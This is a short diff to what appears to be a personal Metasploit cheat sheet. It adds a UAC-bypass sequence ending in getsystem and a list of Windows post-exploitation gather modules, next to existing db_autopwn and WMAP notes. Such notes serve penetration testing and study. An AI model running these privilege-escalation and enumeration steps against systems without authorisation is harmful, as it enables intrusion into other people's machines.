@@ -4,6 +4,19 @@ sudo mv db_autopwn.rb /usr/share/metasploit-framework/plugins
 load db_autopwn
 db_autopwn 
 
+UAC BYPASS -
+net localgroup administrators // shows admins
+bypassuac module_injection 
+set TARGET 1
+set payload 
+getsystem
+
+WINDOWS POST EXP -
+post/windows/gather/enum_shares
+post/windows/gather/enum_computers
+post/windows/gather/enum_applications
+post/windows/gather/checkvm
+
 WMAP -
 load wmap 
 wmap_sites -a ip 
